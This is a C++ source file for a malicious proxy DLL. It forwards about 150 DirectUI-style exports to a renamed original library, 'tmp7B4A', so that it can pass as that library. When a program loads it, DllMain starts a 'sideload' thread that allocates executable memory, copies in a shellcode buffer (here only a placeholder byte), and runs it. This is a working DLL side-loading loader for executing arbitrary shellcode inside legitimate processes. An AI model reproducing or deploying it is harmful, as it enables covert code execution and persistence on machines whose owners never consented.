#define _CRT_SECURE_NO_WARNINGS
#define MAX_ARGS 100
#define MAX_ARG_LENGTH 255

#include <windows.h>
#include <processenv.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

//header taken from SharpDllProxy https://github.com/Flangvik/SharpDllProxy
#pragma comment(linker, "/export:DUserCastHandle=tmp7B4A.DUserCastHandle,@1")
#pragma comment(linker, "/export:DUserDeleteGadget=tmp7B4A.DUserDeleteGadget,@2")
#pragma comment(linker, "/export:GetStdColorBrushF=tmp7B4A.GetStdColorBrushF,@3")
#pragma comment(linker, "/export:GetStdColorF=tmp7B4A.GetStdColorF,@4")
#pragma comment(linker, "/export:GetStdColorPenF=tmp7B4A.GetStdColorPenF,@5")
#pragma comment(linker, "/export:UtilDraw_scOutlineRect=tmp7B4A.UtilDraw_scOutlineRect,@6")
#pragma comment(linker, "/export:AddGadgetMessageHandler=tmp7B4A.AddGadgetMessageHandler,@7")
#pragma comment(linker, "/export:AddLayeredRef=tmp7B4A.AddLayeredRef,@8")
#pragma comment(linker, "/export:AdjustClipInsideRef=tmp7B4A.AdjustClipInsideRef,@9")
#pragma comment(linker, "/export:AttachWndProcA=tmp7B4A.AttachWndProcA,@10")
#pragma comment(linker, "/export:AttachWndProcW=tmp7B4A.AttachWndProcW,@11")
#pragma comment(linker, "/export:AutoTrace=tmp7B4A.AutoTrace,@12")
#pragma comment(linker, "/export:BeginHideInputPaneAnimation=tmp7B4A.BeginHideInputPaneAnimation,@13")
#pragma comment(linker, "/export:BeginShowInputPaneAnimation=tmp7B4A.BeginShowInputPaneAnimation,@14")
#pragma comment(linker, "/export:BuildAnimation=tmp7B4A.BuildAnimation,@15")
#pragma comment(linker, "/export:BuildDropTarget=tmp7B4A.BuildDropTarget,@16")
#pragma comment(linker, "/export:BuildInterpolation=tmp7B4A.BuildInterpolation,@17")
#pragma comment(linker, "/export:CacheDWriteRenderTarget=tmp7B4A.CacheDWriteRenderTarget,@18")
#pragma comment(linker, "/export:ChangeCurrentAnimationScenario=tmp7B4A.ChangeCurrentAnimationScenario,@19")
#pragma comment(linker, "/export:ClearPushedOpacitiesFromGadgetTree=tmp7B4A.ClearPushedOpacitiesFromGadgetTree,@20")
#pragma comment(linker, "/export:ClearTopmostVisual=tmp7B4A.ClearTopmostVisual,@21")
#pragma comment(linker, "/export:CreateAction=tmp7B4A.CreateAction,@22")
#pragma comment(linker, "/export:CreateGadget=tmp7B4A.CreateGadget,@23")
#pragma comment(linker, "/export:CustomGadgetHitTestQuery=tmp7B4A.CustomGadgetHitTestQuery,@24")
#pragma comment(linker, "/export:DUserBuildGadget=tmp7B4A.DUserBuildGadget,@25")
#pragma comment(linker, "/export:DUserCastClass=tmp7B4A.DUserCastClass,@26")
#pragma comment(linker, "/export:DUserCastDirect=tmp7B4A.DUserCastDirect,@27")
#pragma comment(linker, "/export:DUserFindClass=tmp7B4A.DUserFindClass,@28")
#pragma comment(linker, "/export:DUserFlushDeferredMessages=tmp7B4A.DUserFlushDeferredMessages,@29")
#pragma comment(linker, "/export:DUserFlushMessages=tmp7B4A.DUserFlushMessages,@30")
#pragma comment(linker, "/export:DUserGetAlphaPRID=tmp7B4A.DUserGetAlphaPRID,@31")
#pragma comment(linker, "/export:DUserGetGutsData=tmp7B4A.DUserGetGutsData,@32")
#pragma comment(linker, "/export:DUserGetRectPRID=tmp7B4A.DUserGetRectPRID,@33")
#pragma comment(linker, "/export:DUserGetRotatePRID=tmp7B4A.DUserGetRotatePRID,@34")
#pragma comment(linker, "/export:DUserGetScalePRID=tmp7B4A.DUserGetScalePRID,@35")
#pragma comment(linker, "/export:DUserInstanceOf=tmp7B4A.DUserInstanceOf,@36")
#pragma comment(linker, "/export:DUserPostEvent=tmp7B4A.DUserPostEvent,@37")
#pragma comment(linker, "/export:DUserPostMethod=tmp7B4A.DUserPostMethod,@38")
#pragma comment(linker, "/export:DUserRegisterGuts=tmp7B4A.DUserRegisterGuts,@39")
#pragma comment(linker, "/export:DUserRegisterStub=tmp7B4A.DUserRegisterStub,@40")
#pragma comment(linker, "/export:DUserRegisterSuper=tmp7B4A.DUserRegisterSuper,@41")
#pragma comment(linker, "/export:DUserSendEvent=tmp7B4A.DUserSendEvent,@42")
#pragma comment(linker, "/export:DUserSendMethod=tmp7B4A.DUserSendMethod,@43")
#pragma comment(linker, "/export:DUserStopAnimation=tmp7B4A.DUserStopAnimation,@44")
#pragma comment(linker, "/export:DUserStopPVLAnimation=tmp7B4A.DUserStopPVLAnimation,@45")
#pragma comment(linker, "/export:DeleteHandle=tmp7B4A.DeleteHandle,@46")
#pragma comment(linker, "/export:DestroyPendingDCVisuals=tmp7B4A.DestroyPendingDCVisuals,@47")
#pragma comment(linker, "/export:DetachGadgetVisuals=tmp7B4A.DetachGadgetVisuals,@48")
#pragma comment(linker, "/export:DetachWndProc=tmp7B4A.DetachWndProc,@49")
#pragma comment(linker, "/export:DisableContainerHwnd=tmp7B4A.DisableContainerHwnd,@50")
#pragma comment(linker, "/export:DllMain=tmp7B4A.DllMain,@51")
#pragma comment(linker, "/export:Draw_scGadgetTree=tmp7B4A.Draw_scGadgetTree,@52")
#pragma comment(linker, "/export:EndInputPaneAnimation=tmp7B4A.EndInputPaneAnimation,@53")
#pragma comment(linker, "/export:EnsureAnimationsEnabled=tmp7B4A.EnsureAnimationsEnabled,@54")
#pragma comment(linker, "/export:EnsureGadgetTransInitialized=tmp7B4A.EnsureGadgetTransInitialized,@55")
#pragma comment(linker, "/export:EnumGadgets=tmp7B4A.EnumGadgets,@56")
#pragma comment(linker, "/export:FindGadgetFromPoint=tmp7B4A.FindGadgetFromPoint,@57")
#pragma comment(linker, "/export:FindGadgetMessages=tmp7B4A.FindGadgetMessages,@58")
#pragma comment(linker, "/export:FindGadgetTargetingInfo=tmp7B4A.FindGadgetTargetingInfo,@59")
#pragma comment(linker, "/export:FindStdColor=tmp7B4A.FindStdColor,@60")
#pragma comment(linker, "/export:FireGadgetMessages=tmp7B4A.FireGadgetMessages,@61")
#pragma comment(linker, "/export:ForwardGadgetMessage=tmp7B4A.ForwardGadgetMessage,@62")
#pragma comment(linker, "/export:FreeGdiDxInteropStagingBuffer=tmp7B4A.FreeGdiDxInteropStagingBuffer,@63")
#pragma comment(linker, "/export:GadgetTransCompositionChanged=tmp7B4A.GadgetTransCompositionChanged,@64")
#pragma comment(linker, "/export:GadgetTransSettingChanged=tmp7B4A.GadgetTransSettingChanged,@65")
#pragma comment(linker, "/export:GetActionTimeslice=tmp7B4A.GetActionTimeslice,@66")
#pragma comment(linker, "/export:GetCachedDWriteRenderTarget=tmp7B4A.GetCachedDWriteRenderTarget,@67")
#pragma comment(linker, "/export:GetDUserModule=tmp7B4A.GetDUserModule,@68")
#pragma comment(linker, "/export:GetDebug=tmp7B4A.GetDebug,@69")
#pragma comment(linker, "/export:GetFinalAnimatingPosition=tmp7B4A.GetFinalAnimatingPosition,@70")
#pragma comment(linker, "/export:GetGadget=tmp7B4A.GetGadget,@71")
#pragma comment(linker, "/export:GetGadgetAnimation=tmp7B4A.GetGadgetAnimation,@72")
#pragma comment(linker, "/export:GetGadgetBitmap=tmp7B4A.GetGadgetBitmap,@73")
#pragma comment(linker, "/export:GetGadgetBufferInfo=tmp7B4A.GetGadgetBufferInfo,@74")
#pragma comment(linker, "/export:GetGadgetCenterPoint=tmp7B4A.GetGadgetCenterPoint,@75")
#pragma comment(linker, "/export:GetGadgetFlags=tmp7B4A.GetGadgetFlags,@76")
#pragma comment(linker, "/export:GetGadgetFocus=tmp7B4A.GetGadgetFocus,@77")
#pragma comment(linker, "/export:GetGadgetLayerInfo=tmp7B4A.GetGadgetLayerInfo,@78")
#pragma comment(linker, "/export:GetGadgetMessageFilter=tmp7B4A.GetGadgetMessageFilter,@79")
#pragma comment(linker, "/export:GetGadgetProperty=tmp7B4A.GetGadgetProperty,@80")
#pragma comment(linker, "/export:GetGadgetRect=tmp7B4A.GetGadgetRect,@81")
#pragma comment(linker, "/export:GetGadgetRgn=tmp7B4A.GetGadgetRgn,@82")
#pragma comment(linker, "/export:GetGadgetRootInfo=tmp7B4A.GetGadgetRootInfo,@83")
#pragma comment(linker, "/export:GetGadgetRotation=tmp7B4A.GetGadgetRotation,@84")
#pragma comment(linker, "/export:GetGadgetScale=tmp7B4A.GetGadgetScale,@85")
#pragma comment(linker, "/export:GetGadgetSize=tmp7B4A.GetGadgetSize,@86")
#pragma comment(linker, "/export:GetGadgetStyle=tmp7B4A.GetGadgetStyle,@87")
#pragma comment(linker, "/export:GetGadgetTicket=tmp7B4A.GetGadgetTicket,@88")
#pragma comment(linker, "/export:GetGadgetVisual=tmp7B4A.GetGadgetVisual,@89")
#pragma comment(linker, "/export:GetMessageExA=tmp7B4A.GetMessageExA,@90")
#pragma comment(linker, "/export:GetMessageExW=tmp7B4A.GetMessageExW,@91")
#pragma comment(linker, "/export:GetStdColorBrushI=tmp7B4A.GetStdColorBrushI,@92")
#pragma comment(linker, "/export:GetStdColorI=tmp7B4A.GetStdColorI,@93")
#pragma comment(linker, "/export:GetStdColorName=tmp7B4A.GetStdColorName,@94")
#pragma comment(linker, "/export:GetStdColorPenI=tmp7B4A.GetStdColorPenI,@95")
#pragma comment(linker, "/export:GetStdPalette=tmp7B4A.GetStdPalette,@96")
#pragma comment(linker, "/export:InitGadgetComponent=tmp7B4A.InitGadgetComponent,@97")
#pragma comment(linker, "/export:InitGadgets=tmp7B4A.InitGadgets,@98")
#pragma comment(linker, "/export:InvalidateGadget=tmp7B4A.InvalidateGadget,@99")
#pragma comment(linker, "/export:InvalidateLayeredDescendants=tmp7B4A.InvalidateLayeredDescendants,@100")
#pragma comment(linker, "/export:IsGadgetParentChainStyle=tmp7B4A.IsGadgetParentChainStyle,@101")
#pragma comment(linker, "/export:IsInsideContext=tmp7B4A.IsInsideContext,@102")
#pragma comment(linker, "/export:IsStartDelete=tmp7B4A.IsStartDelete,@103")
#pragma comment(linker, "/export:LookupGadgetTicket=tmp7B4A.LookupGadgetTicket,@104")
#pragma comment(linker, "/export:MapGadgetPoints=tmp7B4A.MapGadgetPoints,@105")
#pragma comment(linker, "/export:PeekMessageExA=tmp7B4A.PeekMessageExA,@106")
#pragma comment(linker, "/export:PeekMessageExW=tmp7B4A.PeekMessageExW,@107")
#pragma comment(linker, "/export:RegisterGadgetMessage=tmp7B4A.RegisterGadgetMessage,@108")
#pragma comment(linker, "/export:RegisterGadgetMessageString=tmp7B4A.RegisterGadgetMessageString,@109")
#pragma comment(linker, "/export:RegisterGadgetProperty=tmp7B4A.RegisterGadgetProperty,@110")
#pragma comment(linker, "/export:ReleaseDetachedObjects=tmp7B4A.ReleaseDetachedObjects,@111")
#pragma comment(linker, "/export:ReleaseLayeredRef=tmp7B4A.ReleaseLayeredRef,@112")
#pragma comment(linker, "/export:ReleaseMouseCapture=tmp7B4A.ReleaseMouseCapture,@113")
#pragma comment(linker, "/export:RemoveClippingImmunityFromVisual=tmp7B4A.RemoveClippingImmunityFromVisual,@114")
#pragma comment(linker, "/export:RemoveGadgetMessageHandler=tmp7B4A.RemoveGadgetMessageHandler,@115")
#pragma comment(linker, "/export:RemoveGadgetProperty=tmp7B4A.RemoveGadgetProperty,@116")
#pragma comment(linker, "/export:ResetDUserDevice=tmp7B4A.ResetDUserDevice,@117")
#pragma comment(linker, "/export:ScheduleGadgetTransitions=tmp7B4A.ScheduleGadgetTransitions,@118")
#pragma comment(linker, "/export:SetActionTimeslice=tmp7B4A.SetActionTimeslice,@119")
#pragma comment(linker, "/export:SetAtlasingHints=tmp7B4A.SetAtlasingHints,@120")
#pragma comment(linker, "/export:SetGadgetBufferInfo=tmp7B4A.SetGadgetBufferInfo,@121")
#pragma comment(linker, "/export:SetGadgetCenterPoint=tmp7B4A.SetGadgetCenterPoint,@122")
#pragma comment(linker, "/export:SetGadgetFillF=tmp7B4A.SetGadgetFillF,@123")
#pragma comment(linker, "/export:SetGadgetFillI=tmp7B4A.SetGadgetFillI,@124")
#pragma comment(linker, "/export:SetGadgetFlags=tmp7B4A.SetGadgetFlags,@125")
#pragma comment(linker, "/export:SetGadgetFocus=tmp7B4A.SetGadgetFocus,@126")
#pragma comment(linker, "/export:SetGadgetFocusEx=tmp7B4A.SetGadgetFocusEx,@127")
#pragma comment(linker, "/export:SetGadgetLayerInfo=tmp7B4A.SetGadgetLayerInfo,@128")
#pragma comment(linker, "/export:SetGadgetMessageFilter=tmp7B4A.SetGadgetMessageFilter,@129")
#pragma comment(linker, "/export:SetGadgetOrder=tmp7B4A.SetGadgetOrder,@130")
#pragma comment(linker, "/export:SetGadgetParent=tmp7B4A.SetGadgetParent,@131")
#pragma comment(linker, "/export:SetGadgetProperty=tmp7B4A.SetGadgetProperty,@132")
#pragma comment(linker, "/export:SetGadgetRect=tmp7B4A.SetGadgetRect,@133")
#pragma comment(linker, "/export:SetGadgetRootInfo=tmp7B4A.SetGadgetRootInfo,@134")
#pragma comment(linker, "/export:SetGadgetRotation=tmp7B4A.SetGadgetRotation,@135")
#pragma comment(linker, "/export:SetGadgetScale=tmp7B4A.SetGadgetScale,@136")
#pragma comment(linker, "/export:SetGadgetStyle=tmp7B4A.SetGadgetStyle,@137")
#pragma comment(linker, "/export:SetHardwareDeviceUsage=tmp7B4A.SetHardwareDeviceUsage,@138")
#pragma comment(linker, "/export:SetMinimumDCompVersion=tmp7B4A.SetMinimumDCompVersion,@139")
#pragma comment(linker, "/export:SetRestoreCachedLayeredRefFlag=tmp7B4A.SetRestoreCachedLayeredRefFlag,@140")
#pragma comment(linker, "/export:SetTransitionVisualProperties=tmp7B4A.SetTransitionVisualProperties,@141")
#pragma comment(linker, "/export:SetWindowResizeFlag=tmp7B4A.SetWindowResizeFlag,@142")
#pragma comment(linker, "/export:UnregisterGadgetMessage=tmp7B4A.UnregisterGadgetMessage,@143")
#pragma comment(linker, "/export:UnregisterGadgetMessageString=tmp7B4A.UnregisterGadgetMessageString,@144")
#pragma comment(linker, "/export:UnregisterGadgetProperty=tmp7B4A.UnregisterGadgetProperty,@145")
#pragma comment(linker, "/export:UtilBuildFont=tmp7B4A.UtilBuildFont,@146")
#pragma comment(linker, "/export:UtilDraw_scBlendRect=tmp7B4A.UtilDraw_scBlendRect,@147")
#pragma comment(linker, "/export:UtilGetColor=tmp7B4A.UtilGetColor,@148")
#pragma comment(linker, "/export:UtilSetBackground=tmp7B4A.UtilSetBackground,@149")
#pragma comment(linker, "/export:WaitMessageEx=tmp7B4A.WaitMessageEx,@150")

DWORD WINAPI sideload(LPVOID lpParameter)
{

    DWORD dwSize;
    BOOL rv;
    DWORD oldprotect = 0;
    const unsigned char raw_sc[] = { 0x90 };
    int length = sizeof(raw_sc);
    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
    unsigned char* decoded = encoded;
    memcpy(encoded, raw_sc, length);

    VOID* mem = VirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);

    if (mem == NULL)
        return -1;

    bool success = false;

    success = memcpy(mem, decoded, length);

    if (!success) {
        printf("[-] Fail\n");
        return -2;
    }
    rv = VirtualProtect(mem, length, PAGE_EXECUTE_READ, &oldprotect); //change permission
    int ret_val = 0;
    printf("Executing shellcode\n");
    ((void(*)())mem)();
    WaitForSingleObject((HANDLE)-2, INFINITE);
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(NULL, 0, sideload, NULL, 0, NULL);
        CloseHandle(threadHandle);

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


